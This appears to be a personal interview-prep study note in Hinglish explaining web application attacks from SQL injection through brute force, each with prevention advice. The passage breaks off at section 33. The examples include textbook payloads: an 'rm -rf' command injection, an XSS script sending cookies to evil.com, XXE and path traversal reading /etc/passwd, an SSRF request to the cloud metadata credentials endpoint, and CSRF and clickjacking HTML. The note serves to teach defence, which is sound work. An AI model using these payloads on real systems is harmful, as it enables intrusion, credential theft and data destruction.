---
title: "04 - Application Layer Attacks"
tags: [cybersecurity, appsec, owasp, interview-prep, web-security]
created: 2026-07-15
---

# 04 - Application Layer Attacks

> **How to use this note (bhai, read this first):**
> Application layer = Layer 7 of OSI model = the actual web app (login page, API, forms) that YOU interact with. Most real-world hacks happen here, not on network layer. Every topic below has the same 5-part structure:
> - 🔹 **What it is** (one-line simple definition)
> - 🔹 **How it works** (the "kaise hoy" part)
> - 🔹 **Real Example** (so you can visualize it)
> - 🔹 **Prevention** (interviewer LOVES this part)
> - 🔹 **💬 Interview One-Liner** (memorize this — say this exact line if you freeze in interview)

Use Ctrl/Cmd+F or Obsidian's outline panel on the right to jump to any topic.

---

## Table of Contents
1. [[#1. SQL Injection]]
2. [[#2. NoSQL Injection]]
3. [[#3. Command Injection]]
4. [[#4. LDAP Injection]]
5. [[#5. XPath Injection]]
6. [[#6. Cross Site Scripting (XSS) - Overview]]
7. [[#7. Stored XSS]]
8. [[#8. Reflected XSS]]
9. [[#9. DOM XSS]]
10. [[#10. CSRF (Cross Site Request Forgery)]]
11. [[#11. Broken Authentication]]
12. [[#12. Broken Access Control]]
13. [[#13. Insecure Direct Object Reference (IDOR)]]
14. [[#14. SSRF (Server Side Request Forgery)]]
15. [[#15. XXE (XML External Entity)]]
16. [[#16. Path Traversal]]
17. [[#17. File Upload Vulnerability]]
18. [[#18. Insecure Deserialization]]
19. [[#19. Open Redirect]]
20. [[#20. Clickjacking]]
21. [[#21. Business Logic Attack]]
22. [[#22. Mass Assignment]]
23. [[#23. Race Condition]]
24. [[#24. Session Fixation]]
25. [[#25. Cookie Poisoning]]
26. [[#26. JWT Attack]]
27. [[#27. API Abuse]]
28. [[#28. GraphQL Attack]]
29. [[#29. WebSocket Attack]]
30. [[#30. Rate Limit Bypass]]
31. [[#31. Credential Stuffing]]
32. [[#32. Password Spraying]]
33. [[#33. Brute Force]]
34. [[#34. Replay Attack]]
35. [[#35. Timing Attack]]
36. [[#Quick Revision Table (Night Before Interview)]]

---

## 1. SQL Injection

**What it is:** Attacker inserts malicious SQL code into an input field so the database runs commands it was never supposed to run.

**How it works:** App directly puts user input inside a SQL query string without checking it. So instead of a normal value, attacker sends actual SQL syntax.

**Real Example:**
Login form query built like this:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```
Attacker types in username field:
```
admin' -- 
```
Query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
```
The `--` comments out the password check → attacker logs in as admin without knowing password.

**Types to remember:** In-band (Union-based, Error-based), Blind SQLi (Boolean-based, Time-based), Out-of-band.

**Prevention:**
- Use **Parameterized Queries / Prepared Statements** (never string concatenation)
- Use ORM (Hibernate, Sequelize, SQLAlchemy) properly
- Input validation + allow-listing
- Least privilege DB user (don't give app's DB user admin rights)
- WAF as extra layer (not primary defense)

**💬 Interview One-Liner:** "SQL Injection happens when user input is concatenated directly into a SQL query instead of using parameterized queries — the fix is always prepared statements, never string building."

---

## 2. NoSQL Injection

**What it is:** Same idea as SQLi but targets NoSQL databases like MongoDB, using JSON/operator injection instead of SQL syntax.

**How it works:** NoSQL queries are often built from JSON objects. If input isn't sanitized, attacker sends MongoDB operators like `$gt`, `$ne`, `$where` to manipulate query logic.

**Real Example:**
Login check in MongoDB:
```js
db.users.find({ username: req.body.username, password: req.body.password })
```
Attacker sends JSON body:
```json
{ "username": "admin", "password": { "$ne": "" } }
```
This means "password not equal to empty string" → **always true** → logs in without real password.

**Prevention:**
- Strictly type-check input (reject objects where a string is expected)
- Use libraries like `mongo-sanitize`
- Avoid building queries from raw user input directly
- Use schema validation (Joi, Mongoose schema)

**💬 Interview One-Liner:** "NoSQL Injection abuses operators like `$ne` or `$gt` when the app blindly trusts JSON input types — fix by strict type validation before hitting the DB."

---

## 3. Command Injection

**What it is:** Attacker injects OS-level shell commands through an app that passes user input to system shell.

**How it works:** App calls something like `system()`, `exec()`, `popen()` with user input glued into the command string.

**Real Example:**
A "ping tool" website runs:
```python
os.system("ping " + user_input)
```
Attacker enters:
```
8.8.8.8; rm -rf /important_folder
```
Now two commands run — ping AND delete folder.

**Prevention:**
- Avoid shell execution of user input entirely if possible
- Use safe APIs (e.g. `subprocess.run([...], shell=False)` with argument list, not string)
- Strict input validation (allow-list only expected characters, e.g. only digits/dots for IP)
- Run app with least OS privilege

**💬 Interview One-Liner:** "Command Injection happens when user input reaches a shell command unsanitized — always use `shell=False` with array arguments instead of building a command string."

---

## 4. LDAP Injection

**What it is:** Injecting malicious LDAP query syntax to manipulate directory service (like Active Directory) authentication/search queries.

**How it works:** App builds an LDAP filter string using user input, similar to SQLi but for LDAP filter syntax (`*`, `(`, `)`, `&`, `|`).

**Real Example:**
Filter built as:
```
(&(uid=$username)(password=$password))
```
Attacker enters username as:
```
*)(uid=*))(|(uid=*
```
This manipulates the filter logic to always return true → bypasses login.

**Prevention:**
- Escape special LDAP characters (`*`, `(`, `)`, `\`, NUL)
- Use parameterized LDAP queries / LDAP-safe libraries
- Input validation with allow-list

**💬 Interview One-Liner:** "LDAP Injection is like SQL Injection but for directory queries — special characters like `*` and `()` must be escaped before building the filter."

---

## 5. XPath Injection

**What it is:** Injecting malicious XPath expressions to manipulate XML data queries (used when app stores data in XML instead of SQL DB).

**How it works:** App builds XPath query from user input to search XML nodes; attacker injects XPath syntax to bypass logic or extract data.

**Real Example:**
Query: 
```
//user[username/text()='$user' and password/text()='$pass']
```
Attacker inputs username as:
```
' or '1'='1
```
Result: condition always true → returns first user node (often admin) without valid password.

**Prevention:**
- Use parameterized XPath queries (XPath variable binding)
- Sanitize/escape special XPath characters (`'`, `"`, `[`, `]`)
- Validate and type-check input

**💬 Interview One-Liner:** "XPath Injection is the XML equivalent of SQL Injection — same `' or '1'='1` trick, just against XML queries instead of SQL tables."

---

## 6. Cross Site Scripting (XSS) - Overview

**What it is:** Attacker injects malicious JavaScript into a web page that runs in **other users' browsers**.

**How it works:** App fails to properly encode/sanitize user input before rendering it as HTML. Browser then executes attacker's script thinking it's legit page code.

**Why dangerous:** Can steal cookies/session tokens, do actions as the victim, deface pages, redirect users, keylog.

**3 Main Types (each has own section below):**
- **Stored XSS** – payload saved in DB, runs for every visitor
- **Reflected XSS** – payload bounces back in server response immediately (via URL param)
- **DOM XSS** – payload never touches server, pure client-side JS bug

**Prevention (general):**
- Output encoding (HTML-entity encode before rendering: `<` → `&lt;`)
- Use frameworks that auto-escape (React, Angular escape by default)
- Content Security Policy (CSP) header
- Sanitize HTML input with libraries like DOMPurify
- `HttpOnly` flag on cookies (so JS can't steal them even if XSS happens)

**💬 Interview One-Liner:** "XSS is about injecting JavaScript that runs in the victim's browser due to missing output encoding — the fix is always encode output + CSP + HttpOnly cookies."

---

## 7. Stored XSS

**What it is:** Malicious script gets **permanently saved** in the database (comment, profile bio, review) and executes for every user who views that page.

**How it works:** Attacker submits a comment like `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. App stores it as-is. Every visitor who views the comment section runs this script → their cookies get sent to attacker's server.

**Real Example:** Old-school forum bug — attacker posts malicious comment once, and it steals session cookies of hundreds of users who read that thread.

**Prevention:**
- Sanitize input on save AND encode on output (defense in depth)
- Use DOMPurify / bleach (Python) to strip dangerous tags
- CSP header to block inline scripts

**💬 Interview One-Liner:** "Stored XSS is the most dangerous type because the payload sits in the database and auto-fires for every single visitor, not just one."

---

## 8. Reflected XSS

**What it is:** Malicious script is part of the **request** (usually URL parameter) and gets reflected back immediately in the response — not stored anywhere.

**How it works:** Search page shows: `Results for: <script>...</script>` if it echoes back the search query without encoding. Attacker crafts a malicious URL and tricks victim into clicking it (via phishing email/message).

**Real Example:**
```
http://shop.com/search?q=<script>alert(document.cookie)</script>
```
Victim clicks this link (sent by attacker) → script executes in victim's browser session on that site.

**Prevention:**
- Encode all reflected output immediately
- Don't trust GET/POST params when rendering HTML
- CSP header

**💬 Interview One-Liner:** "Reflected XSS needs the victim to click a malicious crafted link — the payload lives in the URL/request, not the database."

---

## 9. DOM XSS

**What it is:** XSS that happens **purely in client-side JavaScript** — the payload never even reaches the server; the vulnerable code is in the browser's DOM manipulation logic.

**How it works:** JS code reads something like `location.hash` or `document.URL` and writes it into the page using unsafe methods like `innerHTML` without sanitizing.

**Real Example:**
```js
// Vulnerable JS
document.getElementById("welcome").innerHTML = location.hash.substring(1);
```
URL: `http://site.com/#<img src=x onerror=alert(1)>`
Script never touches server — browser's own JS executes the payload directly from the URL fragment.

**Prevention:**
- Avoid `innerHTML`, use `textContent` for untrusted data
- Use safe DOM APIs / sanitize with DOMPurify before inserting HTML
- CSP with `script-src` restrictions

**💬 Interview One-Liner:** "DOM XSS is a client-side-only bug — server logs look totally clean because the payload never leaves the browser; the bug is in unsafe JS sinks like `innerHTML`."

---

## 10. CSRF (Cross Site Request Forgery)

**What it is:** Attacker tricks a logged-in victim's browser into sending an unwanted request to a site where victim is authenticated — without victim's knowledge.

**How it works:** Browsers auto-attach cookies to any request to that domain. Attacker hosts a hidden form/image on their own site that auto-submits a request to the target site. Since victim is already logged in (cookie present), the request looks legit to the server.

**Real Example:**
Victim is logged into `bank.com`. Attacker's page has hidden auto-submit form:
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker_account">
</form>
<script>document.forms[0].submit();</script>
```
Victim just visits attacker's page → money transferred, because browser sent the bank's cookie automatically.

**Prevention:**
- **CSRF tokens** (unique per session/request, checked server-side)
- `SameSite=Strict` or `Lax` cookie attribute
- Check `Origin`/`Referer` header
- Require re-authentication for sensitive actions

**💬 Interview One-Liner:** "CSRF exploits the browser's automatic cookie-attaching behavior — the fix is CSRF tokens plus SameSite cookies so a third-party site's request can't be validated as legit."

---

## 11. Broken Authentication

**What it is:** Umbrella term for weaknesses in login/session management that let attackers impersonate other users.

**How it works:** Weak password policy, no MFA, session tokens exposed in URL, predictable session IDs, no session expiry, session ID not regenerated after login.

**Real Example:** Session ID passed in URL like `?sessionid=1234` — gets logged in browser history/proxy logs/Referer header → anyone with the URL can hijack the session.

**Prevention:**
- Enforce strong passwords + MFA
- Secure session management (random, long session IDs, regenerate after login)
- Session expiry + secure logout
- `HttpOnly`, `Secure`, `SameSite` cookie flags
- Account lockout / rate limiting on login attempts

**💬 Interview One-Liner:** "Broken Authentication covers any weakness in how the app verifies 'who are you' — weak passwords, missing MFA, or session IDs leaking in URLs are the classic culprits."

---

## 12. Broken Access Control

**What it is:** App fails to properly enforce "what a logged-in user is ALLOWED to do" — user can access resources/actions beyond their permission level.

**How it works:** Missing server-side authorization checks. App trusts client-side hiding of buttons/menus as "security" (it's not).

**Real Example:** A normal user changes URL from `/user/dashboard` to `/admin/dashboard` and it just... loads. No server-side role check was done — only the "Admin" menu button was hidden in UI for normal users (which is trivial to bypass).

**Prevention:**
- Enforce authorization checks **server-side**, every request, every endpoint
- Deny by default (whitelist allowed actions per role)
- Use centralized access-control logic (not scattered ad-hoc checks)
- Regular access control testing (this is #1 in OWASP Top 10 2021!)

**💬 Interview One-Liner:** "Broken Access Control is when authorization checks happen only in the UI, not on the server — it's currently OWASP's #1 vulnerability category."

---

## 13. Insecure Direct Object Reference (IDOR)

**What it is:** A specific, very common type of Broken Access Control where app exposes internal object references (like DB IDs) and doesn't check if the current user is allowed to access that specific object.

**How it works:** URL/API uses a direct, guessable identifier. Changing that ID gives access to someone else's data.

**Real Example:**
```
http://app.com/invoice?id=1001   ← belongs to me
```
Attacker changes to:
```
http://app.com/invoice?id=1002   ← belongs to another user
```
If server doesn't check "does invoice 1002 belong to the logged-in user?", attacker sees someone else's invoice.

**Prevention:**
- Always check ownership server-side (`invoice.user_id == session.user_id`)
- Use indirect references (random UUIDs instead of sequential IDs) as extra layer
- Proper access control middleware on every object-fetching endpoint

**💬 Interview One-Liner:** "IDOR is Broken Access Control's most classic example — just change an ID in the URL and get someone else's data, because the server never verified ownership."

---

## 14. SSRF (Server Side Request Forgery)

**What it is:** Attacker tricks the **server** into making requests to unintended locations — often internal/private network resources the attacker couldn't reach directly.

**How it works:** App has a feature that fetches a URL provided by user (e.g., "import image from URL", "webhook URL", "PDF generator fetching a page"). Attacker supplies an internal URL instead of external one.

**Real Example:**
App lets you enter an image URL to fetch and display:
```
POST /fetch-image
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
That's the **AWS metadata endpoint** — server fetches it and attacker gets cloud credentials back in the response! This is a real, famous attack pattern (used in the Capital One breach, 2019).

**Prevention:**
- Allow-list of permitted domains/protocols for server-side fetch features
- Block requests to internal IP ranges (169.254.x.x, 127.0.0.1, 10.x.x.x, 192.168.x.x)
- Disable unused URL schemas (file://, gopher://, etc.)
- Network segmentation (app server shouldn't reach cloud metadata endpoint at all)

**💬 Interview One-Liner:** "SSRF turns the server itself into an attack proxy — the classic real-world example is hitting the cloud metadata endpoint `169.254.169.254` to steal IAM credentials, like in the Capital One breach."

---

## 15. XXE (XML External Entity)

**What it is:** Attack against XML parsers that process external entity references, letting attacker read local files, do SSRF, or cause DoS.

**How it works:** XML supports "entities" — like variables. If parser resolves `DOCTYPE` with `SYSTEM` external entities, attacker can define an entity pointing to a local file.

**Real Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
If the app parses this XML and echoes back the "foo" value, it leaks the contents of `/etc/passwd`.

**Prevention:**
- **Disable DTD (DOCTYPE) processing** in XML parser entirely — this is the #1 fix
- Use less-capable/safe parsing libraries (defusedxml in Python)
- Prefer JSON over XML where possible
- Input validation/allow-listing

**💬 Interview One-Liner:** "XXE happens when an XML parser resolves external entities — disabling DTD processing in the parser config is the single fix that kills this whole vulnerability class."

---

## 16. Path Traversal

**What it is:** Attacker manipulates file path input to access files/directories outside the intended folder — also called "Directory Traversal".

**How it works:** App builds a file path using user input without validating it, and attacker uses `../` sequences to climb up directories.

**Real Example:**
```
http://site.com/download?file=report.pdf
```
Attacker changes to:
```
http://site.com/download?file=../../../../etc/passwd
```
If not sanitized, the server reads and returns the system password file instead of the intended report.

**Prevention:**
- Never use raw user input to build file paths
- Use an allow-list of specific filenames, not free-text paths
- Resolve path and verify it's still inside the intended base directory (canonicalization check)
- Run app with restricted filesystem permissions (chroot/sandbox)

**💬 Interview One-Liner:** "Path Traversal is the classic `../../etc/passwd` attack — always canonicalize the resolved path and confirm it's still inside the allowed base directory."

---

## 17. File Upload Vulnerability

**What it is:** App allows users to upload files without proper validation, letting attacker upload a malicious file (like a web shell) that gets executed on the server.

**How it works:** App only checks file extension (client-side or weakly server-side) and stores upload in a web-accessible folder. Attacker renames a malicious script to bypass checks, or uses double extensions/null bytes/MIME spoofing.

**Real Example:**
Site allows "profile picture" upload, only checking `.jpg` extension client-side. Attacker uploads `shell.php.jpg` or intercepts request and renames to `shell.php`, then visits `http://site.com/uploads/shell.php` → gets remote code execution.

**Prevention:**
- Validate file type by **content** (magic bytes), not just extension
- Rename uploaded files (don't trust original filename)
- Store uploads **outside** the web root, or in a non-executable directory
- Set proper permissions (no execute bit on upload folder)
- Use a dedicated file storage service (S3 etc.) with no script execution
- Antivirus/malware scanning on upload

**💬 Interview One-Liner:** "File Upload vulnerabilities happen when the server trusts the file extension instead of the actual content — always store uploads outside the web root with no execute permission."

---

## 18. Insecure Deserialization

**What it is:** App deserializes untrusted data (converting serialized bytes/string back into objects) without validation, letting attacker craft malicious serialized objects to achieve remote code execution or logic bypass.

**How it works:** Languages like Java, PHP, Python (pickle) can serialize entire objects including code/behavior. If attacker controls the serialized input, they can craft an object whose deserialization triggers unintended method calls ("gadget chains").

**Real Example:** A Java app stores user session as a serialized object in a cookie. Attacker crafts a malicious serialized payload using known "gadget chain" tools (like `ysoserial`) and replaces the cookie → when the server deserializes it, arbitrary code executes on the server.

**Prevention:**
- Avoid deserializing data from untrusted sources at all if possible
- Use safer data formats (JSON with strict schema) instead of native object serialization
- If must deserialize, use integrity checks (signing, HMAC) before deserializing
- Keep deserialization libraries patched, use allow-listing of classes that can be deserialized

**💬 Interview One-Liner:** "Insecure Deserialization lets attacker-controlled serialized objects trigger unintended code execution via gadget chains — prefer JSON with schema validation over native object serialization."

---

## 19. Open Redirect

**What it is:** App redirects users to a URL supplied via input parameter without validating it's a safe/internal destination.

**How it works:** App has redirect logic like `redirect(request.GET['url'])`. Attacker crafts a link to the trusted site that redirects to attacker's phishing page — victim trusts the link because it starts with the real domain.

**Real Example:**
```
http://trustedsite.com/login?redirect=http://evil-phishing-site.com
```
Victim sees "trustedsite.com" in the link and clicks, trusting it, but ends up on a phishing page mimicking login, after being bounced there.

**Prevention:**
- Avoid user-controlled redirect URLs; use an allow-list of valid redirect targets
- If must allow it, use relative paths only (no full external URLs)
- Show a warning/interstitial page before redirecting off-site

**💬 Interview One-Liner:** "Open Redirect abuses user trust in a legitimate domain to bounce them to a phishing site — fix with an allow-list of valid redirect destinations, never raw user input."

---

## 20. Clickjacking

**What it is:** Attacker tricks a user into clicking something different from what they perceive, by overlaying a transparent malicious page/button on top of a legitimate one (using invisible iframes).

**How it works:** Attacker embeds the target site in a transparent `<iframe>` and places a fake, tempting button (e.g. "Click to win!") right on top of an invisible real button (e.g. "Delete Account" or "Transfer Funds") on the legit site.

**Real Example:**
```html
<style>iframe {opacity: 0; position: absolute; top:0; left:0;}</style>
<button style="position:absolute; top:0; left:0;">Click to claim prize!</button>
<iframe src="http://bank.com/transfer?amount=5000&to=attacker"></iframe>
```
Victim thinks they're clicking "claim prize" but actually clicks the invisible "Transfer" button underneath.

**Prevention:**
- `X-Frame-Options: DENY` or `SAMEORIGIN` header
- `Content-Security-Policy: frame-ancestors 'none'` (modern replacement)
- Frame-busting JS (legacy, weaker option)

**💬 Interview One-Liner:** "Clickjacking hides a real button under a fake UI using a transparent iframe — `X-Frame-Options` or CSP's `frame-ancestors` directive stops the page from being framed at all."

---

## 21. Business Logic Attack

**What it is:** Attacker abuses the intended **workflow/rules** of the application in unintended ways — no "hacking" of code, just exploiting flawed logic/assumptions.

**How it works:** App logic assumes users will follow the "normal" flow. Attacker skips steps, repeats steps, or manipulates values in ways developers never anticipated.

**Real Example:** An e-commerce checkout applies a discount coupon **before** calculating shipping, and lets you apply the same coupon multiple times by resubmitting the request → final price becomes negative or near-zero. Or: attacker adds item to cart, changes quantity to negative number, total becomes negative → store owes attacker money(!).

**Prevention:**
- Server-side validation of every business rule (never trust client-calculated totals)
- Enforce state machine of workflow steps (can't skip from step 1 to step 5)
- Rate limit and monitor for abnormal usage patterns
- Thorough logic-focused testing/threat modeling, not just automated scanners (business logic bugs are usually missed by scanners!)

**💬 Interview One-Liner:** "Business Logic Attacks don't break any code — they abuse the app's intended workflow assumptions, like applying a coupon twice, which is exactly why automated scanners usually miss them."

---

## 22. Mass Assignment

**What it is:** Attacker sends extra, unexpected fields in a request that get automatically bound to a backend object/model, letting them modify fields they shouldn't have access to.

**How it works:** Frameworks (Rails, Django, Spring) can auto-map JSON request body fields directly to model attributes. If developer doesn't restrict which fields are "bindable", attacker can add fields like `isAdmin: true`.

**Real Example:**
Legit signup request:
```json
{ "username": "raj", "password": "1234" }
```
Attacker adds a field:
```json
{ "username": "raj", "password": "1234", "role": "admin" }
```
If the backend model has a `role` field and blindly maps all incoming JSON keys, attacker just signed up as an admin.

**Prevention:**
- Use **allow-lists (DTOs)** — explicitly define which fields can be set from user input
- Never bind request body directly to sensitive models
- Framework-specific protections (`strong_parameters` in Rails, explicit serializers in Django REST Framework)

**💬 Interview One-Liner:** "Mass Assignment happens when a framework auto-binds every JSON field to the model — always use an explicit allow-list/DTO so extra fields like `role: admin` get ignored."

---

## 23. Race Condition

**What it is:** Attacker exploits the timing gap between "check" and "use" of a resource (TOCTOU - Time Of Check To Time Of Use) by sending multiple requests simultaneously.

**How it works:** App checks a condition (e.g., "is balance sufficient?") and then acts on it (deduct balance) — but these two steps aren't atomic. Sending many requests at the exact same time can slip past the check multiple times before any single deduction completes.

**Real Example:** A coupon code is "valid for one use only." Attacker sends 100 simultaneous requests to redeem the same coupon at the exact same millisecond. Since each request checks "has this been used?" before any single one finishes marking it as used, all 100 succeed — attacker gets 100x discount instead of 1x.

**Prevention:**
- Use **atomic database transactions / row-level locking** (`SELECT ... FOR UPDATE`)
- Use idempotency keys for critical operations (payments, redemptions)
- Application-level mutex/locks for critical sections
- Rate limiting on sensitive endpoints

**💬 Interview One-Liner:** "Race Conditions exploit the gap between check-and-use — the fix is atomic transactions or row-level locks so simultaneous requests can't all pass the same check."

---

## 24. Session Fixation

**What it is:** Attacker sets/fixes a known session ID for a victim BEFORE they log in, so once victim authenticates, attacker can use that same known session ID to hijack their session.

**How it works:** App doesn't regenerate session ID after successful login — it just re-uses whatever session ID existed before. Attacker gives victim a pre-known session ID (e.g., via a crafted link with `?sessionid=ABC123`), victim logs in, and now session `ABC123` is authenticated — attacker uses the same ID to access the account.

**Real Example:**
```
http://site.com/login?PHPSESSID=attackerknownid123
```
Victim clicks link, logs in normally. Session `attackerknownid123` is now a valid authenticated session. Attacker opens the same site with that same session ID → logged in as victim.

**Prevention:**
- **Regenerate session ID immediately after login** (this is THE fix)
- Don't accept session IDs from URL parameters
- Set proper session cookie flags (`HttpOnly`, `Secure`)
- Session timeout/expiry

**💬 Interview One-Liner:** "Session Fixation is when the session ID isn't regenerated after login — the single fix is: always issue a brand new session ID the moment authentication succeeds."

---

## 25. Cookie Poisoning

**What it is:** Attacker modifies/tampers with cookie values to manipulate the app's behavior, often because sensitive data (like user role, price, permissions) is stored client-side in the cookie without integrity protection.

**How it works:** App trusts cookie content without verifying it hasn't been tampered with. Attacker edits cookie value directly in browser dev tools or intercepting proxy (Burp Suite).

**Real Example:**
Cookie: `role=user`
Attacker edits browser cookie to: `role=admin`
If server just reads this cookie value and trusts it for authorization decisions, attacker becomes admin instantly.

**Prevention:**
- Never store sensitive/authorization data in **plain**, unsigned cookies
- Sign cookies with HMAC / encrypt cookie values, verify signature server-side on every request
- Store authoritative state server-side (session store), cookie should just hold a random session ID reference
- `HttpOnly`, `Secure`, `SameSite` flags

**💬 Interview One-Liner:** "Cookie Poisoning happens when the app trusts unsigned client-side cookie data for authorization — always sign/encrypt cookies and keep the real state server-side."

---

## 26. JWT Attack

**What it is:** Family of attacks that exploit weaknesses in how an app creates, verifies, or trusts JSON Web Tokens used for stateless authentication.

**How it works (common variants):**
- **`alg: none` attack:** Attacker changes JWT header algorithm to `none`, removes signature — some poorly-coded verifiers accept unsigned tokens as valid.
- **Algorithm confusion (RS256 → HS256):** If server supports both, attacker can sign a token with HS256 using the server's **public** RSA key (which is, well, public) as the HMAC secret — server incorrectly verifies it as valid.
- **Weak secret brute-force:** If HS256 secret is weak/guessable, attacker brute-forces it, then forges any token they want (e.g., `role: admin`).
- **No expiry check / no signature verification at all** in some buggy implementations.

**Real Example:** Server accepts a JWT like:
```json
{"alg":"none","typ":"JWT"}
{"user":"attacker","role":"admin"}
```
with empty signature. Buggy library trusts it → attacker is "logged in" as admin with a self-made token.

**Prevention:**
- Always explicitly whitelist accepted algorithms server-side (reject `none`)
- Never let algorithm be chosen dynamically by the token itself
- Use strong, long random secrets (or better, RS256 with properly separated keys)
- Set short expiry + refresh tokens, verify signature on EVERY request
- Use well-maintained JWT libraries, don't roll your own verification

**💬 Interview One-Liner:** "JWT attacks usually exploit trust in the token's own header — like accepting `alg: none` or confusing RS256 with HS256 — the fix is to hardcode the expected algorithm server-side, never trust what the token claims."

---

## 27. API Abuse

**What it is:** Broad category where attacker misuses legitimate API functionality/endpoints in unintended ways — excessive calls, scraping, logic abuse, or exploiting weak API-specific controls.

**How it works:** APIs often expose more functionality/data than the UI shows, have weaker rate limiting, or trust client input more (mobile app APIs especially). Attacker interacts directly with API endpoints (bypassing the UI entirely) using tools like Postman/Burp.

**Real Example:** A "check username availability" API returns different error messages for "username taken" vs "invalid format" — attacker scripts thousands of requests to enumerate every valid username in the system (user enumeration), then uses that list for credential stuffing.

**Prevention:**
- Rate limiting + throttling per API key/IP/user
- Proper authentication + authorization on EVERY endpoint (not just UI-facing ones)
- Generic error messages (don't leak "username exists" vs "wrong password")
- API Gateway with monitoring/anomaly detection
- Versioning + deprecating old insecure API versions properly

**💬 Interview One-Liner:** "API Abuse exploits the fact that APIs often expose more logic and weaker controls than the UI on top of them — always apply the same auth, rate-limiting, and validation to the API as you would the UI."

---

## 28. GraphQL Attack

**What it is:** Attacks specific to GraphQL APIs, exploiting their flexible query structure — since GraphQL lets clients ask for exactly the data/depth they want, this flexibility itself becomes a weapon.

**How it works (common variants):**
- **Introspection abuse:** GraphQL's introspection feature (meant for docs/tooling) can reveal the entire schema, including hidden/internal fields, to any attacker if left enabled in production.
- **Deeply nested query / query depth DoS:** Attacker crafts a query with excessive nested fields (e.g., friends-of-friends-of-friends...) causing massive server load with a single request.
- **Batching attack:** Sending many operations in one request to bypass rate limiting (which often counts "1 HTTP request" = "1 attempt").
- **Broken access control per-field:** Some fields might not have the same authorization checks as the main resolver.

**Real Example:**
```graphql
query {
  user(id: 1) {
    friends { friends { friends { friends { name } } } } 
  }
}
```
This single query can cause exponential database load, effectively a DoS attack from ONE request.

**Prevention:**
- Disable introspection in production
- Limit query depth and complexity (query cost analysis)
- Rate limit at the operation level, not just HTTP request level
- Apply authorization checks at the field/resolver level, not just top-level query

**💬 Interview One-Liner:** "GraphQL attacks abuse its own flexibility — like deeply nested queries causing a DoS from a single request — always enforce query depth/cost limits and disable introspection in production."

---

## 29. WebSocket Attack

**What it is:** Attacks targeting the persistent, bidirectional WebSocket connections used for real-time apps (chat, live feeds, trading platforms).

**How it works:** WebSockets don't automatically enforce Same-Origin Policy like normal HTTP requests do (the initial handshake is an HTTP request, but once upgraded, browsers don't block cross-origin WS connections the same way). Common issue: **Cross-Site WebSocket Hijacking (CSWSH)** — similar to CSRF but for WebSockets.

**Real Example:** A chat app opens a WebSocket connection relying only on the session cookie for auth (no CSRF-like token check during the WS handshake). Attacker's malicious page opens a WebSocket connection to the chat app's endpoint from the victim's browser — cookie auto-attaches, connection succeeds, attacker can now read/send messages as the victim.

**Prevention:**
- Validate `Origin` header during WebSocket handshake, reject unexpected origins
- Use token-based auth (not just cookies) for WS handshake, tied to CSRF-protection style tokens
- Enforce authentication/authorization checks for every message, not just at connection time
- Input validation on all messages sent over WS (it's still user input!)

**💬 Interview One-Liner:** "WebSocket attacks mainly revolve around Cross-Site WebSocket Hijacking, since the handshake relies on cookies without CSRF-style protection — always validate the `Origin` header during the handshake."

---

## 30. Rate Limit Bypass

**What it is:** Techniques attackers use to get around an application's request-throttling controls, so they can brute-force, scrape, or abuse endpoints without getting blocked.

**How it works (common techniques):**
- Rotating IP addresses (proxies, botnets, VPNs)
- Spoofing headers rate-limiter trusts, like `X-Forwarded-For` (if the rate limiter keys off this header without validating it, attacker just sets a new fake IP each request)
- Using different API keys/accounts for parallel requests
- Case/encoding variation in URL (`/login` vs `/Login` vs `/login/` sometimes bypass path-based limiters if not normalized)
- Distributing requests just under the threshold, spread over many endpoints/servers

**Real Example:** Rate limiter blocks after 5 failed logins **per IP**. Attacker adds header `X-Forwarded-For: 1.2.3.4`, `X-Forwarded-For: 1.2.3.5`, etc. on each request — if the app naively trusts this header as the "real" client IP, attacker gets unlimited attempts.

**Prevention:**
- Rate limit based on multiple factors (IP + account + device fingerprint + API key), not just one easily-spoofed header
- Don't trust `X-Forwarded-For` unless behind a properly configured, trusted reverse proxy that sets it correctly
- Normalize URLs before matching rate-limit rules
- Use CAPTCHA / progressive delays after threshold
- Global + per-endpoint rate limiting (not just per-endpoint)

**💬 Interview One-Liner:** "Rate Limit Bypass usually comes down to spoofable identifiers like `X-Forwarded-For` — rate limit on multiple combined signals, not a single header you can't trust."

---

## 31. Credential Stuffing

**What it is:** Attacker uses lists of **already-breached** username/password pairs (from other site's data breaches) and tries them against a different target site, betting on password reuse.

**How it works:** Millions of leaked credentials are freely available from past breaches. Attacker automates login attempts across many sites using these exact same combos — works because so many people reuse passwords across sites.

**Real Example:** Data breach leaks `john@email.com : Password123` from Site A. Attacker's bot tries this exact combo on Site B, Site C, Site D, etc. If John reused that password anywhere, attacker gets in — no guessing/brute-forcing needed, just replaying known-valid combos.

**Prevention:**
- **Multi-Factor Authentication (MFA)** — the single strongest defense
- CAPTCHA on login, especially after a few failures
- Detect and block known-breached password reuse at signup (check against breach databases like "Have I Been Pwned" API)
- Device fingerprinting + anomaly detection (login from new device/location triggers extra verification)
- Rate limit login attempts per account/IP

**💬 Interview One-Liner:** "Credential Stuffing replays real breached username-password pairs from OTHER sites, banking on password reuse — MFA is the strongest single defense since a leaked password alone isn't enough."

---

## 32. Password Spraying

**What it is:** Attacker tries **one common password** (like `Summer2024!`) against **many different usernames**, instead of many passwords against one username.

**How it works:** Traditional brute-force triggers account lockout quickly (many attempts on ONE account). Password spraying flips this — spreads attempts across thousands of accounts with just 1-2 common passwords, staying under per-account lockout thresholds.

**Real Example:** Attacker has a list of 10,000 employee emails from LinkedIn/company website. Tries `Welcome@123` against all 10,000 accounts, once each. Statistically, a few employees will have set exactly this weak/common password → attacker gets valid access without ever triggering a "5 failed attempts" lockout on any single account.

**Prevention:**
- Ban common/weak passwords at signup (check against common password lists)
- Monitor for "low and slow, wide" login patterns (same password tried across many accounts) — not just per-account lockout
- MFA
- Geographic/velocity-based anomaly detection

**💬 Interview One-Liner:** "Password Spraying flips brute-force logic — one common password against MANY usernames — specifically to stay under per-account lockout thresholds; detection needs to watch for patterns across accounts, not just within one."

---

## 33. Brute Force

**What it is:** Attacker systematically tries many possible passwords (or other secret values) against ONE account/target until the correct one is found.

